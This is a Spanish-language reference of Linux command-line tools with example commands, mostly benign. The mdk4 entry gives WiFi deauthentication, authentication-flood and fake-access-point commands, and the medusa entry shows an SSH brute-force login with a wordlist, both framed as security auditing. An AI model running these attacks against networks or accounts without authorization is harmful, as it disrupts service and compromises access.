Herramienta para crear libros con Markdown.
$ mdbook init (en el directorio del markdown, crea la estructura y los archivos del nuevo libro)
$ mdbook test (comprueba que los ejemplos de código de Rust de un libro se compilen)
$ mdbook build (crea un libro a partir de sus archivos Markdown)
$ mdbook clena (elimina un libro creado)
$ mdbook watch (supervisa los archivos de un libro y lo reconstruye al cambiar)
$ mdbook serve (muestra un libro en http://localhost:3000 y lo reconstruye al cambiar)
$ mdbook build --help (obtener más información sobre un comando específico)


mdbtools
Herramientas diseñadas para leer, exportar, consultar y manipular archivos de bases de datos de Microsoft Access [formato .mdb y en algunos casos .accdb, aunque el soporte para este último es limitado]. Consta de las siguientes ejecutables: mdb-array, mdb-count, mdb-export, mdb-header, mdb-hexdump, mdb-import, mdb-json, mdb-parsecsv, mdb-prop, mdb-queries, mdb-schema, mdb-sql, mdb-tables y mdb-ver.
$ mdb-ver mi_base.mdb (muestra la versión del archivo MDB, Access 97, 2000, 2003, etc)
$ mdb-tables mi_base.mdb (lista todas las tablas en la base de datos)
$ mdb-schema mi_base.mdb (genera el esquema SQL de la base de datos, CREATE TABLE, índices, etc)
$ mdb-schema mi_base.mdb -T Clientes (generar solo para una tabla)
$ mdb-schema base.mdb | sqlite3 nueva_base.sqlite (crear esquema en SQLite)
$ mdb-export mi_base.mdb Clientes > clientes.csv (exporta una tabla a formato CSV)
$ mdb-export -d '|' mi_base.mdb Clientes > clientes_pipe.csv (exportar con delimitador personalizado, por ejemplo, "|")
$ mdb-export -I "ID,Nombre" mi_base.mdb Clientes (exportar solo ciertas columnas)
$ mdb-json mi_base.mdb Clientes (exporta una tabla en formato JSON)
$ mdb-sql mi_base.mdb (ejecuta consultas SQL interactivas o desde línea de comandos sobre la base MDB)
$ mdb-count mi_base.mdb Clientes (cuenta el número de registros en una tabla)
$ mdb-header mi_base.mdb (muestra metadatos del archivo MDB, no de las tablas, sino del archivo en sí [fecha de creación, versión interna, tamaño, etc])
$ mdb-hexdump mi_base.mdb 0 (muestra el contenido binario [hexadecimal] de una página específica del archivo MDB)
$ mdb-prop mi_base.mdb (muestra propiedades del archivo MDB, como título, autor, fecha de creación, etc, si están definidas)
$ mdb-queries mi_base.mdb (lista las consultas guardadas [queries] en la base de datos Access)
$ mdb-array mi_base.mdb Clientes (exporta los datos de una tabla en formato de arrays [por columnas], útil para procesamiento en lenguajes como Python o R)
$ mdb-import mi_base.mdb Clientes nuevos_clientes.csv (importa datos desde un archivo CSV a una tabla existente en la base MDB. No crea la tabla, solo inserta datos. La tabla debe existir previamente)
$ mdb-parsecsv -d ',' archivo.csv (parsea un archivo CSV y lo convierte a formato interno de mdbtools)
Notas.- No soporta escritura completa. Se puede importar datos, pero no se puede crear tablas, modificar esquemas o borrar registros directamente. El soporte para archivos .accdb [Access 2007+] es limitado o inexistente en versiones antiguas. Versiones recientes (>= 0.9) tienen soporte experimental. Algunas herramientas pueden fallar si la base de datos está corrupta o protegida con contraseña ya que mdbtools no soporta contraseñas.


mdetect
Herramienta para configurar automáticamente mouses
$ mdetect -v


mdevctl
Creación y administración de dispositivos virtuales derivados de hardware físico, usados comúnmente en soluciones de virtualización. Utilidad para administrar y mantener dispositivos en la estructura de dispositivos mediados [mdev] del kernel de Linux. Los dispositivos mediados son subdispositivos de un dispositivo principal, por ejemplo, una vGPU que pueden crearse dinámicamente y ser utilizados por controladores como vfio-mdev para su asignación a máquinas virtuales.
$ mdevctl start -u 30820a6f-b1a5-4503-91ca-0c10ba58692a -p 0000:01:00.0 --type nvidia-63 (crear vGPU mediada. -u UUID único para la instancia mdev, -p Bus PCI del dispositivo físico y --type Tipo de recurso mediado [varía según hardware]
$ mdevctl define --auto --uuid 30820a6f-b1a5-4503-91ca-0c10ba58692a (que un dispositivo mediado se cree automáticamente al inicio [persistencia])
$ mdevctl list (listar todos los dispositivos mediados)
$ mdevctl stop -u 30820a6f-b1a5-4503-91ca-0c10ba58692a (borrar o desactivar un dispositivo mediado)


mdf2iso
Convertir imágenes MDF a ISO
$ mdf2iso archivo.mdf archivo.iso


mdk4
Herramienta de auditoría de seguridad para redes WiFi que permiten probar la resistencia de puntos de acceso y clientes mediante diversos tipos de ataques de denegación de servicio [DoS] y pruebas de estrés. mdk4 es una versión mejorada de mdk3 con más modos de ataque y mejor rendimiento
# airmon-ng start wlan0 (poner la interfaz en modo monitor)
# airodump-ng wlan0mon (ver redes disponibles)
# mdk4 wlan0 a (Utilizar la interfaz wireless para ejecutar un test DoS)
# mdk4 wlan0mon d -b lista_APs.txt (desautenticar todos los clientes de un AP específico)
# mdk4 wlan0mon d -c CC:CC:CC:CC:CC:CC -B SSID_AP (desautenticar un cliente específico)
# mdk4 wlan0mon a -a AA:AA:AA:AA:AA:AA -m (enviar peticiones de autenticación masivas)
# mdk4 wlan0mon b -f /usr/share/wordlists/rockyou.txt -c 11 (crear APs falsos masivamente)
# mdk4 wlan0mon p -e "Fake_Network" -s 1000 (enviar probes requests masivos)
# mdk4 wlan0mon b -n "Test_Network" -c 6 -s 10 (ejemplo de testing controlado)
Para crear lista de APs objetivo:
$ echo "AA:AA:AA:AA:AA:AA" > lista_APs.txt
$ echo "BB:BB:BB:BB:BB:BB" >> lista_APs.txt


mdm
Gestor de sesión del proyecto MATE. El archivo de configuración en:
# nano /etc/mdm/mdm.conf
Seleccionar un tema de los disponibles en /usr/share/mdm/themes/:
GraphicalTheme= XXXXX
Entrada automática:
[daemon]
AutomaticLoginEnable=true
AutomaticLogin=USUARIO


mdns-reflector
Utilidad de alto rendimiento para reflejar consultas y respuestas de mDNS entre varias LANs, permitiendo que dispositivos en distintas redes se detecten mutuamente aunque estén segmentados por motivos de seguridad. Esto es especialmente útil en escenarios con IoT o dispositivos inteligentes distribuidos en VLANs separadas. mdns-reflector recibe paquetes de mDNS [puerto UDP 5353, multicast 224.0.0.251] en varias interfaces de red, y los reenvía entre ellas, haciendo que los dispositivos mDNS de una red puedan descubrir servicios en otra, como impresoras, Chromecast o hubs domóticos.
# mdns-reflector -i eth0 -i eth1 (lanzar el demonio especificando las interfaces que actuarán como “puentes” mDNS)


mdns-scan
Herramienta para buscar servicios mDNS/DNS-SD publicados en la red local. Recupera una lista de todos los servicios registrados en el enlace local.
$ mdns-scan


mdnsd
Daemon que implementa mDNS [Multicast DNS], permitiendo que sistemas pequeños anuncien y descubran servicios como FTP, HTTP y SSH en redes locales sin necesidad de un servidor DNS centralizado. Su uso es habitual en entornos ligeros o integrados donde se busca auto-descubrimiento de servicios. Utiliza UDP y por defecto el puerto 5353 para mDNS multinodal, anunciando y resolviendo. Los servicios se muestran en /etc/mdnsd/services/ssh.service
# mdnsd (inicia el daemon y comienza a gestionar anuncios y consultas mDNS en la red local)
# mdns-scan (listará servicios detectables por mDNS, incluyendo los que mdnsd haya anunciado en este host)
Se acomseja que la configuración incluya la linea:
# nano /etc/nsswitch.conf
        hosts: files mdns4_minimal [NOTFOUND=return] dns
Para priorizar resolución mDNS antes de DNS clásico.


mdp
Presentaciones con terminal en markdown.
$ mdp presentacion.mdp (arrancar la presentación)
Sintaxis de la presentación
	-> # El título de la diapositiva <-
	-> Subtitulo <-
	*_Otra forma de subtitular_*
	> Palabra precedida del signo > muestra como una cita
	* Palabras o frases precesidas por asterisco crean una lista
	1. Palabras precedidas por numeros con punto crean lista
	*texto marcado de color*
	*_texto marcado de color y subrayado_*
	[google](http://google.es)
	--- (Con 3 guiones termina la diapositiva para pasar a la siguiente)
	# otra forma de colocar titulo
	Otro titulo (texto subrayado)
	----------
	`lista anidada`
	- *Distros*
    	- Las mejores
        	- Debian
        	- Arch
        	- Ubuntu
        	- Mint
    	- Las peores
        	- ventanas
        	- manzanas comidas
	texto tabulado para marcar codigo


media-player-info
Archivos de identificación de reproductores multimedia. media-player-info es un repositorio de archivos de datos que describen las capacidades de los reproductores multimedia, principalmente los de almacenamiento masivo USB. Estos archivos contienen información sobre la distribución de directorios que se debe usar para agregar música a estos dispositivos, los formatos de archivo compatibles, etc. Las capacidades de los reproductores de música ahora se describen en archivos *.mpi [media player info], similares a archivos ini, junto con las reglas udev para identificar estos dispositivos.
El proceso es el siguiente:
Cuando se conecta un reproductor de música USB a la computadora, el sistema operativo, a través de herramientas como udev y librerías como libmtp [Media Transfer Protocol], lo identifica. udev utiliza las reglas que vienen con el paquete media-player-info para emparejar la información del dispositivo, como su ID de vendedor y producto, con el archivo .mpi correspondiente.
Una vez identificado, el sistema sabe: Dónde guardar la música y qué estructura de directorios utiliza el dispositivo. Por ejemplo, si la música debe ir a una carpeta llamada "Music" o "Audio" y qué formatos soporta: MP3, FLAC, OGG, etc. Esta información es crucial para que aplicaciones como Rhythmbox, Amarok o Banshee puedan sincronizar música de forma correcta y sin problemas con el reproductor.


media-types
Es un paquete que proporciona el archivo /etc/mime.types. Este archivo es una base de datos que asocia tipos MIME [Multipurpose Internet Mail Extensions] con las extensiones de archivo más comunes. Su función principal es ayudar a los programas a identificar el tipo de contenido de un archivo basándose en su extensión, lo que es útil para aplicaciones como servidores web, gestores de archivos, navegadores, etc.
$ cat /etc/mime.types | grep "text/html"
        text/html	html htm shtml
$ cat /etc/mime.types | grep "image/png"
        image/png	png
$ grep "jpeg" /etc/mime.types
        image/jpeg	jpeg jpg jpe jfif
        video/jpeg2000


mech-dump
Muestra información sobre una página web.
$ mech-dump --all URL (toda)
$ mech-dump --headers URL (cabeceras)
$ mech-dump --links (de todos los enlaces)


mediaconch
Herramienta de código abierto diseñada para verificar, validar y corregir archivos audiovisuales, especialmente aquellos utilizados en la preservación digital, como los formatos Matroska, LPCM y FFV1.
$ mediaconch -mi archivo.mkv (verificar si un archivo cumple con las especificaciones del formato)
$ mediaconch -p politica.xml archivo.mkv (definir políticas personalizadas en formato XML. Para validar un archivo contra una política)
$ mediaconch -fh archivo.mkv > informe.html (generar un informe en formato HTML)
$ mediaconch --fix archivo.mkv (sugerir correcciones para que un archivo cumpla con las especificaciones pero no modifica el original pero proporciona instrucciones para hacerlo)
$ mediaconch -mi directorio/* (verificar múltiples archivos)
1.-
Para crear una política personalizada con requisitos especificos:
$ nano politica.xml
        <policy>
          <rule name="VideoCodec" value="FFV1" />
          <rule name="AudioCodec" value="LPCM" />
        </policy>
Guardar este archivo y úsarlo con el comando -p.


mediainfo
Utilidad que se utiliza para recuperar información técnica y otros metadatos sobre archivos de audio o vídeo.
$ mediainfo -f archivo.mp3 (con la máxima información)
$ mediainfo --Output=HTML archivo.wav > archivo.html (volcar la información a un archivo html para abrir con el navegador)


mediascanner2.0
Herramienta para escanear y catalogar archivos multimedia en el directorio del usuario para que las aplicaciones, como reproductores de música o galerías de imágenes, puedan acceder a ellos de forma rápida y eficiente. No dispone de argumentos ni página man y el ejecutable se llama:
$ mediascanner-service-2.0 (scanea todo el directorio del usuario para catalogar archivos multimedia)


medusa
Herramienta para ataques de fuerza bruta contra un variado conjunto de protocolos.
# medusa -d  (módulos disponibles)
# medusa -h 127.0.0.1 -u usuario -P wordlist -M ssh
opciones:
-h host (Especificar un host)
-H file (Especificar un fichero con un listado de hosts)
-u username (Especificar el usuario)
-U file	 (Especificar un listado de usuarios)
-p password (especificar una contraseña a probar)
-P file	 (indicamos un diccionario de contraseñas)
-M module (Especificar un módulo de los disponibles)


megatools
Herramientas para interactuar con el servicio de almacenamiento en la nube Mega.nz, anteriormente Mega.co.nz y no oficialmente mantenidas. Permite subir y descargar archivos y carpetas enteras, listar contenido del almacenamiento en la nube, crear, mover, renombrar o eliminar archivos/directorios, descargar en streaming para reproducir videos/audio sin descargarlos completamente, copiar entre directorios en Mega, ver información de cuentas y cuota disponible.
Mustra de un archivo de configuración básico
$ nano ~/.megarc
        [Login]
        Username = user@correo.com
        password = contraseña
$ megareg --register --email user@correo.com --name USER --password XXXXXXX (sin archivo de configuració, la contraseña queda en el hitorial)
$ megals / (muestra todo el contenido raíz de tu cuenta Mega)
$ megals /Mis_Documentos (lista el contenido de una carpeta específica)
$ megacopy --local /home/usuario/documento.pdf --remote /Mis_Documentos/documento.pdf (sube documento.pdf desde el disco local a la carpeta /Mis_Documentos en Mega)
$ megacopy --local /home/usuario/FotosVacaciones --remote /Fotos/ (sube toda la carpeta FotosVacaciones recursivamente)
$ megacopy --remote /Mis_Documentos/informe.pdf --local ~/Descargas/informe.pdf (descarga informe.pdf desde Mega a tu carpeta local)
$ megacopy --remote /Fotos/Viaje2024 --local ~/Descargas/Viaje2024 (descargar una carpeta completa)
$ megadl --stream /Videos/pelicula.mp4 | vlc - (inicia la descarga en streaming y la redirige a VLC como entrada estándar [-]. No se guarda el archivo en disco hasta que se reproduce)
$ curl -s "$(megadl --stream /Videos/pelicula.mp4)" | mpv - (devuelve la URL de descarga en tiempo real, que se puede usar con curl, wget, etc para escuchar música)
$ megamkdir /NuevaCarpeta (crea una nueva carpeta en la raíz de la cuenta)
$ megamv /Mis_Documentos/antiguo.txt /Mis_Documentos/nuevo.txt (renombra el archivo)
$ megamv /Mis_Documentos/archivo.txt /Otros/archivo.txt (mueve el archivo a otra carpeta)
$ megarm /Mis_Documentos/temporal.txt (elimina el archivo)
$ megarm /ViejasFotos (elimina la carpeta completa. No hay papelera)
$ megadf (muestra el uso de almacenamiento)
$ megals --recursive / | grep "factura" (busca todos los archivos que contengan factura en su nombre en toda tu cuenta)
Nota.- megatools puede dejar de funcionar si Mega actualiza su protocolo


meli
Cliente de correo y noticias [usenet] compatible con múltiples cuentas, Maildir, almacenamiento de contenido mbox, almacenamiento limitado de metadatos y protocolos IMAP, JMAP y NNTP.
Ejemplo de configuración para Gmail. Se ha de activar “Contraseñas de aplicación” en gmail.
$ nano ~/.config/meli/config.toml
        [accounts]
         [[accounts]]
         name = "personal"
         email = "tuemail@gmail.com"
         inbox = "~/Mail/inbox"
         sent = "~/Mail/sent"
        [[accounts.imap]]
         server = "imap.gmail.com"
         port = 993
         username = "tuemail@gmail.com"
         password = "tucontraseñaapp"  # Usa contraseña de app, no la de cuenta normal
         tls = true
        [[accounts.smtp]]
         server = "smtp.gmail.com"
         port = 587
         username = "tuemail@gmail.com"
         password = "tucontraseñaapp"
         tls = true
$ meli (entra en el interfaz de usuario mostrando todas las cuentas)
Navegación básica:
        j / k --> Bajar / subir mensaje
        Enter --> Abrir mensaje
        q --> Salir del mensaje o salir de la vista actual
        Q --> Salir de meli
        c --> Cambiar cuenta
        C --> Crear nuevo mensaje
        r --> Responder
        d --> Marcar como eliminado
        u --> Desmarcar eliminado
        / --> Buscar texto
        # --> Filtrar por etiqueta [ej: #unread]
        t --> Cambiar etiquetas [tags]
$ meli -a personal -f inbox (ver mensajes sin leer)


melt
Editor de video y reproductor de audio.
$ melt video.mp4
$ melt audio.wav


members
Muestra los miembros del grupo especificado.
$ members -a grupo  (todos sus miembros)
$ members -p grupo  (el usuario primario)
$ members -s grupo  (los secundarios)


memdump
Programa que vuelca la memoria del sistema a la salida estándar, omitiendo los huecos en los mapas de memoria. Por defecto, el programa vuelca el contenido de la memoria física. Este programa no funcionará si CONFIG_STRICT_DEVMEM está habilitado en el kernel. Desde la versión 2.6, varios kernels habilitan esta opción por defecto.
# memdump -s 1024 -b 16 | hexdump -C (leerá 1 KB de memoria y lo mostrará en hex de forma segura)
# memdump (vuelca /dev/mem [memoria física del sistema] y muestra bytes binarios en pantalla)
Nota.- Si memdump se ejecuta sin parámetros, puede leer más de la cuenta o tocar zonas sensibles [mapeos de kernel o dispositivos], y el sistema puede caer. En kernels modernos, /dev/mem está muy restringido, por eso a veces devuelve solo ceros o corta en 1 MB, pero sigue siendo peligroso.


memlockd
Herramienta del sistema diseñada para mejorar la resiliencia y la estabilidad de un sistema Linux bajo condiciones de alta carga de memoria o pánico de memoria. En esencia, su función principal es bloquear archivos clave del sistema en la RAM, impidiendo que sean intercambiados [swapped] al disco duro. El paginamiento excesivo ocurre cuando el sistema operativo necesita más memoria RAM de la que tiene disponible. Para liberar espacio, mueve páginas de memoria que no se usan activamente al disco duro, área de intercambio o swap. Si esta situación se vuelve extrema, el sistema se ralentiza drásticamente, haciendo casi imposible interactuar con él, incluso para iniciar sesión o ejecutar comandos básicos. Cuando se inicia, el daemon memlockd lee una lista de archivos y bibliotecas esenciales como /bin/login, /bin/getty, /bin/bash, y las bibliotecas compartidas que usan y las bloquea en la memoria. Al hacerlo, garantiza que los procesos de inicio de sesión, la consola de administración y otras herramientas críticas permanezcan accesibles y reactivos, incluso si el resto del sistema está sufriendo una sobrecarga de memoria. El uso de memlockd no evita que el sistema se ralentice, pero asegura que las herramientas de rescate y administración sigan funcionando para que se pueda solucionar el problema.
# systemctl enable memlockd


memo
Software de toma de notas y tareas pendientes estilo UNIX.
$ memo -a "comprar pan" (entrar una nota)
$ memo -a "recoger a juan" 2025-09-25
$ memo -s (ver listado de notas)
$ memo -f comprar (buscar notas con la palabra "comprar")
$ memo -r 2 "recoger a juan y a enrique" (modificar la entrada 2 con nuevo texto)
$ memo -P 1 (posponer una nota)
$ memo -P (mostrar todas las notas pospuestas)
$ memo -u (mostrar solo notas sin hacer, sin las pospuestas)
$ memo -T (marcar todas las notas como hechas)
$ memo -R (suprimir todas las notas marcadas como hechas)
$ memo -o (listar notas según fecha)
$ memo -M (marcar nota como no hecha)
$ memo -m (marcar nota como hecha)
$ memo -l 3 (mostrar las últimas 3 notas)
$ memo -d 2 (suprimir la nota 2)
$ memo -D (suprimir todas las notas)
$ memo -e html notas (descargar todas las notas a un archivo html "notas")


memoria
Liberar memória física
# sync
# echo 3 > /proc/sys/vm/drop_caches


memstat
Enumera todos los procesos, ejecutables y bibliotecas compartidas que están consumiendo memoria virtual.
$ memstat -v
$ memstat -p PID


memtest86
[memtest86+]. Software diseñado para encontrar problemas que pueden afectar a los módulos de memoria RAM del equipo. La aplicación requiere iniciarse independiente del sistema operativo y consiste en escribir una serie de datos con 9 patrones de escritura distintos a la totalidad de direcciones de la memoria RAM. Una vez realizada la escritura se leerá el contenido escrito en la memoria RAM y se comprobará que sea el mismo que el contenido original. La duración del test es infinita y por lo tanto deberemos ser nosotros mismos cuando decidimos pararlo, o sea que cada "pasada" significa escribir y leer los 9 patrones de escritura distintos una vez. Si se realizan 3 "pasadas" significa repetir el test completo 3 veces. Si no se desactiva la opción se encuentra en el gestor de arranque grub [ver]


memtester
Utilidad para probar el subsistema de memoria en busca de fallas.
$ memtester 10 2 (con 10 MB y 2 bucles)


memtool
Herramienta que permite leer y escribir en la memoria física del sistema a través de /dev/mem útil para diagnosticar hardware, probar registros de dispositivos, desarrollar o depurar firmware, drivers o sistemas embebidos e interactuar con registros de control de chips, como GPIO, UART, PWM, etc. en placas como Raspberry Pi, BeagleBone, etc. memtool accede directamente a la memoria física. Usarlo mal puede causar bloqueos del sistema, corrupción de datos o reinicios inesperados. Solo debe usarse con conocimiento profundo del hardware y bajo condiciones controladas, preferiblemente en sistemas embebidos o de pruebas.
# memtool 0x44E07000 (leer el valor de un registro de un dispositivo mapeado en la dirección 0x44E07000)
# memtool -w 0x44E07000 0xDEADBEEF (escribir 0xDEADBEEF en la dirección 0x44E07000. Verificar con el comando anterior)
# memtool -b 0x44E07000 (leer solo 1 byte, útil para registros de estado de GPIO)
# sudo memtool -b 0x481AF01C 0x01 (Suponiendo que el registro de salida de GPIO está en 0x481AF01C, activar un pin GPIO)
Nota.- En sistemas modernos con CONFIG_STRICT_DEVMEM=y [predeterminado en kernels de Debian], solo se permite acceder a ciertas regiones de memoria, evitando acceso a áreas críticas del kernel. Si se intenta acceder a una dirección prohibida, se obtendrá: memtool: Cannot access /dev/mem: Operation not permitted


memusage
Perfila el uso de memoria de un programa mientras se está ejecutando.
$ memusage -p imagen script.sh (crear un gráfico con la salida del script.sh)


mencal
Calendario de ciclos menstruales. El archivo de configuración si no lo crea la misma aplicación despues de lanzarse con los datos de la opción -c. Puede configurarse personalmente editando el archivo:
$ nano ~/.mencalrc
  length 28
  duration 4
  name periodo
  color yellow
$ mencal -m -3 (calendario empieza el lunes, mostrar 3 meses)
$ mencal -m -y (que muestre todo el año actual)
$ mencal -m -y 2025 (el año especificado)
$ mencal -m -3 -c s=20231101,l=28,d=4,n=periodo,f=~/.mencalrc,c=yellow (sin archivo de configuración)


mencoder
Procesador de video.
$ mencoder mf://*.jpg -ovc lavc -o out.avi (Crear un video de las imágenes de un directorio)
$ mencoder "mf://*.jpg" -mf fps=0.5 -vf scale=480:360 -o output.avi -ovc lavc -lavcopts vcodec=mpeg4  (Hacer video avi con imagenes jpg mostrando foto cada 2 segundos)
fps=0.5  (cada 2 segundos)
fps=0.25  (cada 4 segundos)
$ mencoder video.avi -sub subtitulos.srt -oac copy -ovc lavc -o resultado_final.avi -subcp latin1 -font /usr/share/fonts/TTF/arial.ttf -subfont-text-scale 2.8  (pegar subtítulos- *.srt- a un video- *.avi- especificando la fuente de letras y la medida)
$ mencoder input.flv -ovc lavc -oac mp3lame -o output.avi  (convertir flv a avi)
$ mencoder -idx video_corrupto.avi -ovc copy -oac copy -o video_reparado.avi (Reconstruir un video dañado)
$ mencoder -endpos 00:00:23 -ovc copy -oac copy entrada.avi -o salida.avi (Guardar los primeros 23 segundos de un video)
$ mencoder -ss 00:00:02 -oac copy -ovc copy entrada.avi -o salida.avi (desechar los primeros 2 segundos de un video)
$ mencoder -ss 00:00:10 -endpos 00:02:20 -oac pcm -ovc raw entrada.mkv -o salida.mkv (cortar desde los 10 segundos a los 2,20 minutos de un video con los codecs especificados [pcm y raw]))
$ mencoder -oac copy -ovc copy -o resultado.avi *.avi (Unir todos los .avi de un directorio en un video "resultado.avi")
	-ovc copy (Se utilizará la misma codificación de video que en el original)
	-oac copy (Se utilizará la misma codificación de audio que en el original)


menu
Mantiene sincronizados los menús de los diferentes gestores de ventanas con la lista de programas instalados. Cada aplicación que desea aparecer crea un archivo en /usr/share/menu/<paquete> usando una sintaxis específica para declarar cómo quiere mostrarse la entrada, su nombre, icono y comando de ejecución. Cuando se instala o elimina un paquete, el menú se actualiza automáticamente ejecutando comandos internos en los scripts de postinstalación, manteniendo los menús del sistema sincronizados con las aplicaciones presentes. Incluye las aplicaciones install-menu, su-to-root y update-menus
# update-menus (se regeneran los menús de todos los gestores compatibles como IceWM, WindowMaker, Enlightenment, etc. para reflejar cualquier cambio reciente de aplicaciones o entradas personalizadas)
install-menu es llamado internamente por update-menus y se encarga de ejecutar los "métodos de menú" específicos a cada gestor de ventanas para traducir la base de datos del menú al formato específico requerido por el gestor de ventanas.
# install-menu /etc/menu-methods/icewm (Esto toma la base del menú y la convierte a un menú nativo de IceWM. En la práctica, rara vez se invoca de forma manual)
$ su-to-root -X -p root -c synaptic (el comando es un programa X11 que no requiere una terminal, ejecutar como root y comando que se abrirá)


meow
Imprime gatos ASCII en la terminal vriando la forma cada vez que se ejecuta.
$ meow (imprime un gato)
$ meow -c 3 (imprime 3 gatos)
$ meow -l (soy literalmente este gato)


mercurial
Es un sistema de gestión de control de versiones rápido y ligero, diseñado para la gestión eficiente de proyectos distribuidos de gran tamaño
$ hg clone URL (para clonar un repositorio)
$ hg init (crear un nuevo repositorio en el directorio indicado)
$ hg status (ver todos los cambios pendientes)
$ hg add (añadir los archivos especificados en la próxima confirmación. Si no se especifica ningún archivo, todos los nuevos archivos se añaden al repositorio)
$ hg commit (confirmar los cambios)
$ hg push (enviar los cambios)
$ hg pull (recuperar los cambios que han realizado y llevado al repositorio)
$ hg update (mostrar los cambios asociados en el repositorio local)
$ hg rollback (deshace la última operación de Mercurial)
$ hg log (mostrar el historial de revisiones de todo el repositorio)
$ hg summary (resumir el estado del directorio de trabajo)
Ejemplo básico de archivo de configuración
$ nano /.hgrc
        [ui]
            username = William von Hagen
            editor = emacs -nw
            verbose = True


merecat
Es un servidor web sencillo basado en thttpd que admite todas las funciones básicas necesarias para la mayoría de los casos de uso. Las características más destacadas son probablemente HTTPS, el uso de OpenSSL, PHP, múltiples servidores con soporte para redireccionamiento HTTP, redirección de HTTP a HTTPS, hosts virtuales y limitación del tráfico URL.
Ejemplo de configuración básica del servidor:
# nano /etc/merecat/merecat.conf
        # Directorio raíz donde están los archivos del sitio
        docroot=/var/www/misitio
        #
        # Puerto que escucha el servidor
        port=80
        #
        # Habilitar HTTPS y especificar el puerto, certificado y clave privada
        # sslport=443
        # sslcert=/etc/ssl/certs/misitio.pem
        # sslkey=/etc/ssl/ssl.key/misitio.pem
        #
        # Habilitar el soporte de PHP
        # cgi=/usr/bin/php-cgi
        #
        # Habilitar los hosts virtuales
        # vhost=1
Nota.- Algunas líneas que empiezan con # están comentadas. Para habilitar al característica, simplemente eliminar el #.
Ejemplo de configuración para crear un host virtual. Cada archivo en este directorio representa un host virtual:
# nano /etc/merecat/vhosts
**Ejemplo de archivo para `misitio.com`**:
`$ nano /etc/merecat/vhosts/misitio.com`
        # Archivo de configuración para misitio.com
        docroot=/var/www/misitio.com
        logfile=/var/log/merecat/misitio.com.log
        # Redirección de HTTP a HTTPS
        # rewrite_rules="^/(.*)$ https://misitio.com/$1 [R=301,L]"
# systemctl start merecat (iniciar el servidor)
# systemctl restart merecat (reiniciar si se han realizado cambios)


mergerfs
Herramienta que permite combinar varios sistemas de archivos o directorios en uno solo, presentándolos como un único punto de montaje. Es especialmente útil cuando se tiene múltiples discos duros, particiones o incluso unidades de red y se quiere gestionarlos como si fueran una sola unidad lógica. Esto es ideal para servidores, NAS [Network Attached Storage], o cualquier escenario donde se necesite agrupar espacio de almacenamiento disperso. A diferencia de RAID, mergerfs no ofrece redundancia ni mejora el rendimiento, solo une espacios de almacenamiento. Si un disco falla se pierde la información [ver snapraid]
# mergerfs /mnt/disco1:/mnt/disco2:/mnt/disco3 /mnt/almacenamiento (Con 3 discos montados, crear un punto de montaje unificado)
# mergerfs /mnt/disco1:/mnt/disco2:/mnt/disco3 /mnt/almacenamiento -o defaults,allow_other,category.create=epmfs,moveonenospc=true ("allow_other" permite acceso a otros usuarios, "category.create" crea nuevos archivos en el disco con más espacio libre y "moveonenospc" mueve automáticamente archivos si un disco se llena)
Montaje automático al iniciar el sistema
# nano /etc/fstab
y añadir:
        /mnt/disco1:/mnt/disco2:/mnt/disco3 /mnt/almacenamiento fuse.mergerfs allow_other,category.create=epmfs,moveonenospc=true 0 0
Elegir cómo mergerfs decide dónde guardar los archivos [category.create]:
epmfs --> Usa el disco con más espacio libre [default].
epall --> Distribuye los archivos en todos los discos simultáneamente.
ff --> Llena un disco antes de pasar al siguiente.
# df -h /mnt/almacenamiento (ver cómo están distribuidos los archivos)
# mergerfs.ctldfs -o debug /mnt/almacenamiento (lo mismo)


mesa-drm-shim
Este paquete proporciona bibliotecas de reemplazo [shims] para simular o interceptar llamadas al subsistema DRM [Direct Rendering Manager] del kernel de Linux. DRM es una parte del kernel de Linux que gestiona el acceso directo al hardware gráfico [GPU], especialmente para aceleración 3D, modos de video, buffers de pantalla, etc. Es fundamental para que Mesa, la implementación de OpenGL/Vulkan de código abierto. funcione correctamente con drivers como i915, amdgpu, nouveau, etc.
# dpkg -L mesa-drm-shim (ver su contenido)
1.-
Ejecutar glxinfo en un entorno sin DRM
Supongamos que se está en un contenedor Docker sin acceso a /dev/dri/card0. Normalmente, glxinfo fallaría con:
        Error: unable to open display
o
        libGL error: failed to load driver: ...
Pero si se tiene instalado mesa-drm-shim, se puede hacer:
        LD_PRELOAD=/usr/lib/x86_64-linux-gnu/drm-shim/libdrm_shim.so glxinfo | grep "OpenGL renderer"
Y así intercepta las llamadas a libdrm y las redirige a una implementación simulada, permitiendo que glxinfo se ejecute, aunque con renderizado por software, como llvmpipe.
2.-
Probar un driver de Mesa en CI sin GPU
En un entorno de integración continua, como GitLab CI o GitHub Actions, se podría tener un script así:
$ nano .gitlab-ci.yml
test-mesa-driver:
  image: ubuntu:22.04
  script:
    - apt update && apt install -y mesa-utils mesa-drm-shim
    - LD_PRELOAD=/usr/lib/x86_64-linux-gnu/drm-shim/libdrm_shim.so glxinfo -B
Esto permitirá ver qué driver de software está usando Mesa, por ejemplo, llvmpipe o softpipe, sin necesidad de GPU real.
3.-
Forzar renderizado por software con shim
A veces se quiere asegurar de que la app use software rendering incluso si hay GPU. Se puede combinar el shim con variables de entorno de Mesa:
        export LIBGL_ALWAYS_SOFTWARE=1
        LD_PRELOAD=/usr/lib/x86_64-linux-gnu/drm-shim/libdrm_shim.so glxgears
Notas.- No emula hardware real, solo intercepta llamadas y devuelve respuestas básicas o simuladas. No acelera nada. Solo útil para pruebas y debugging, no para uso en producción ni para obtener rendimiento gráfico y depende de Mesa y se necesita tener instalado mesa-utils o similar para tener glxinfo, glxgears, etc.


mescc-tools
Herramientas de supervivencia para iniciar la construcción de un compilador o un sistema operativo desde cero. Son herramientas para el arranque binario [que no se construyen a partir de código fuente de manera normal sinó que proporcionan directamente ejecutables binarios muy simples y confiables]. Las herramientas incluidas ofrecen funcionalidades mínimas, utilizadas en las primeras etapas [compilar, ensamblar, enlazar] del arranque [Bootstrapping] de una cadena de herramientas [Toolchain] y son M1, blood-elf, catm, get_machine, hex2 y kaem.
$ m1 hola.s -o hola (compilar un archivo hola.s para obtener un ejecutable)
$ blood-elf -f hola.o -o hola.sym (procesa archivos objeto, output del ensamblador, para generar tablas de símbolos)
$ catm version.h "VERSION=1.0" < version.h.in (crearía version.h con el contenido: #define VERSION "1.0")
$ get_machine (detectar y imprimir la arquitectura de la máquina actual)
$ hex2 -o simple simple.hex (convertir archivo simple.hex en un binario ejecutable)
$ kaem construir.kaem (con un script construir.kaem, describe los pasos para construir un programa)


mesg
Controla el acceso a la terminal por otros usuarios. Se utiliza para permitir o rechazar que otros usuarios escriban mensajes a la propia terminal
$ mesg y   (autoriza)
$ mesg n   (desautoriza)


meshio-tools
